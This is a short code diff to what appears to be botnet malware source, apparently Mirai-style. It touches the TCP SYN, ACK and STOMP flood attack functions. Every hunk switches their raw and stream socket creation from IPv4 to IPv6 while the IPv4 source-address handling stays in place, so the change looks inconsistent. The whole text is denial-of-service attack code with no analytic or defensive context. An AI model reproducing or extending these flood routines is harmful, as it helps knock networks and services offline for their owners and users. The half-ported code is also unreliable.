@@ -35,7 +35,7 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, FALSE);
     uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+    if ((fd = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
@@ -180,7 +180,7 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
     uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
 
-    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+    if ((fd = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to create raw socket. Aborting attack\n");
@@ -310,7 +310,7 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
 
     // Set up receive socket
-    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
+    if ((rfd = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
         printf("Could not open raw socket!\n");
@@ -338,7 +338,7 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
 
         stomp_setup_nums:
 
-        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+        if ((fd = socket(AF_INET6, SOCK_STREAM, 0)) == -1)
         {
 #ifdef DEBUG
             printf("Failed to create socket!\n");
